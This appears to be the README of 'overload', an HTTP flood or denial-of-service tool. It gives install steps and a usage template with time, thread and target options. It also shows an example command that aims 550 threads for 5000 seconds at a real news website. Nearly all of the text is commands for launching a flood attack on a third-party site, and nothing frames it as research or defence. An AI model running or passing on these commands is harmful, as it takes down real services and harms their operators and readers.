# overload

sudo apt update
sudo apt install python3 python3-pip git -y
git clone https://github.com/7zx/overload
cd overload/
pip3 install -r requirements.txt or python -m pip install -r requirements.txt

python3 overload.py --time XXX --threads XXX --target [URL] --method HTTP

python3 overload.py --time 5000 --threads 550 --target https://www.publico.pt/ --method HTTP
